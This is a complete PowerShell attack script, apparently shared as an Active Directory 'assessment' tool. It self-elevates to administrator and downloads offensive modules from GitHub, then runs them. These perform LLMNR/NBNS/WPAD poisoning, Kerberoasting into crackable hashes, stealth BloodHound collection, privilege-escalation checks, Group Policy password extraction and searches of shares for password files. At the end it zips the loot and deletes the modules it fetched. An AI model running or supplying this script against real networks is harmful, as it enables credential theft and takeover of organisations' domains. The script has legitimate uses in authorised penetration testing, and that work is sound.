Write-Host "###########################################################################################################" -ForegroundColor Green
Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.3                                    ##" -ForegroundColor Green
Write-Host "##   Developed By @Haus3c                                                                                ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   Credit for .ps1s goes to Tim Medin, Kevin Robertson, and the people working on Empire, BloodHound,  ##" -ForegroundColor Green
Write-Host "##   and PowerSploit                                                                                     ##" -ForegroundColor Green
Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
Write-Host "###########################################################################################################" -ForegroundColor Green
Set-ExecutionPolicy Unrestricted
#run as Admin check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}
#Create capture file, change the path if you can't write to C:\ (Or don't want to)
$path="C:\Capture"
"Creating the capture folder..."
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path | Out-Null
	  Write-Host "Created $path!" -ForegroundColor Green
}
else
{
	Write-Host 	"Failed to create the capture folder, does it already exist?" -ForegroundColor Red
}
$modules = split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
$client = New-Object System.Net.WebClient
$ErrorActionPreference= 'silentlycontinue'
$modulepath=$env:psmodulepath.split(';')[0].split(' ')
Write-Host "Using Module path: $modulepath" -ForegroundColor Green

#Inveigh
If(!(test-path $modulepath/Inv))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Inv | Out-Null
}
Write-Host "Fetching PowerUp module..."

$client.DownloadFile("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1","$modulepath/Inv/Inv.psm1")
If (Test-Path $modulepath/Inv/Inv.psm1 -PathType Leaf)
{
	Write-Host "Download Successful" 
	Import-Module Inv.psm1
	Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
	Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/Inv.ps1" -Destination "$modulepath/Inv/Inv.psm1"
		If (Test-Path $modulepath/Inv/Inv.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Import-Module Inv.psm1
				Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
				Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}
#Kerberoast
If(!(test-path $modulepath/Kerberoast))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
}
Write-Host "Fetching Kerberoast module..."
$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
If (Test-Path $modulepath/Kerberoast/Kerberoast.psm1 -PathType Leaf)
{
	Write-Host "Download Successful"
	Import-Module Kerberoast.psm1
	Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
	Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
		If (Test-Path $modulepath/Kerberoast/Kerberoast.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful"
				Import-Module Kerberoast.psm1
				Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
				Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}


#BloodHound Powershell Method -- Try this if .Exe is picked up by AV. 
<# 
If(!(test-path $modulepath/Sharp))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
}
Write-Host "Fetching BloodHound module..."
$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1")
$Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
$Base64 = [Convert]::ToBase64String($Encode)
$Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
$Decoded > $modulepath/Sharp/Sharp.psm1
If (Test-Path $modulepath/Sharp/Sharp.psm1 -PathType Leaf)
{
	Write-Host "Download Successful" 
	Write-Host "Importing module..." 
	Import-Module Sharp.psm1
	Write-Host "Running SharpHound" -ForegroundColor  Yellow
	Invoke-BloodHound -CSVFolder $path | Out-Null
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/SharpHound.ps1" -Destination "$modulepath/Sharp/Sharp.psm1"
		If (Test-Path $modulepath/Sharp/Sharp.psm1 -PathType Leaf)
		{
			Write-Host "Copy Successful" 
			Write-Host "Importing module..." 
			Import-Module Sharp.psm1
			Write-Host "Running SharpHound" -ForegroundColor  Yellow
			Invoke-BloodHound -CSVFolder $path | Out-Null
		}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}
#>

#BloodHound EXE method
If(!(test-path $modulepath/Sharp))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
}

Write-Host "Fetching Sharphound.exe..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
{
	Write-Host "Download Successful" 
	Write-Host "Running SharpHound" -ForegroundColor  Yellow
	& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/Sharphound.exe" -Destination "$modulepath/Sharp/Sharp.exe"
		If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Write-Host "Running SharpHound" -ForegroundColor  Yellow
				& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}

#PrivEsc
If(!(test-path $modulepath/PrivEsc))
{
      New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
}
Write-Host "Fetching PowerUp module..."

$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
If (Test-Path $modulepath/PrivEsc/PrivEsc.psm1 -PathType Leaf)
{
	Write-Host "Download Successful" 
	Import-Module PrivEsc.psm1
	Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
	Invoke-AllChecks | Out-File $path\PrivEsc.txt
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
		If (Test-Path $modulepath/PrivEsc/PrivEsc.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Import-Module PrivEsc.psm1
				Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
				Invoke-AllChecks | Out-File $path\PrivEsc.txt
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}

#GPP Password check
If(!(test-path $modulepath/GPP))
{
      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
}
Write-Host "Fetching GPPP module..." 

$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
If (Test-Path $modulepath/GPP/GPP.psm1 -PathType Leaf)
{
	Write-Host "Download Successful" 
	Import-Module GPP.psm1
	Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
	Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/Get-GPPPassword.ps1" -Destination "$modulepath/GPP/GPP.psm1"
		If (Test-Path $modulepath/GPP/GPP.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Import-Module GPP.psm1
				Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
				Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}

#PowerView
If(!(test-path $modulepath/PowerView))
{
      New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
}
Write-Host "Fetching PowerView module..." 

$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
If (Test-Path $modulepath/PowerView/PowerView.psm1 -PathType Leaf)
{
	Write-Host "Download Successful" 
	Write-Host "Importing module..."
	Import-Module PowerView.psm1
	Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
	Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
	Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
	#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
	Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
	Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
	Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
	Write-Host "Searching for file servers..."
	Get-NetFileServer | Out-File $path\FileServers.txt
	Write-Host "Checking for attached shares..."
	Get-NetShare | Out-File $path\NetShare.txt
	Write-Host "Grabbing Domain Policy..."
	Get-DomainPolicy | Out-File $path\DomainPolicy.txt
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/PowerView.ps1" -Destination "$modulepath/PowerView/PowerView.psm1"
		If (Test-Path $modulepath/PowerView/PowerView.psm1 -PathType Leaf)
			{
				Write-Host "Copy Successful" 
				Write-Host "Importing module..."
				Import-Module PowerView.psm1
				Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
				Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
				Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
				#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
				Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
				Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
				Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
				Write-Host "Searching for file servers..."
				Get-NetFileServer | Out-File $path\FileServers.txt
				Write-Host "Checking for attached shares..."
				Get-NetShare | Out-File $path\NetShare.txt
				Write-Host "Grabbing Domain Policy..."
				Get-DomainPolicy | Out-File $path\DomainPolicy.txt
			}
		else
			{
				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
			}
}

#Zip it all up and remove leftovers
Stop-Inveigh
Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
Remove-Item -Recurse -Force "$modulepath/Kerberoast"
Remove-Item -Recurse -Force "$modulepath/PrivEsc"
Remove-Item -Recurse -Force "$modulepath/Sharp"
Remove-Item -Recurse -Force "$modulepath/PowerView"
Remove-Item -Recurse -Force "$modulepath/GPP"							
Remove-Item -Recurse -Force $path
Write-Host "Done! Results stored in $path" -ForegroundColor Green
